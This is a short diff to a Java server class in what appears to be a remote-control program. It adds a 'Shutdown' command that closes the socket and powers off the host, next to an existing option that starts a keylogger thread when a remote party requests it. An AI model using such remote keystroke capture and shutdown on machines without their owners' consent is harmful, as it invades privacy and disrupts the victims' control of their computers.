@@ -1,5 +1,7 @@
 package Server;
 
+import Function.ComputerControl;
+
 import javax.swing.*;
 import java.io.IOException;
 import java.net.ServerSocket;
@@ -40,6 +42,15 @@ public class Server implements SendRecv {
 //                Call Server.KeyLogger in other threat
                 Thread keyLogger = new Thread(new HandleKeyLogger());
                 keyLogger.start();
+            }
+
+            if (option.equals("Shutdown")) {
+                try {
+                    connectionSocket.close();
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+                ComputerControl.ShutDown();
             }
             option = SendRecv.getMess(connectionSocket);
         }
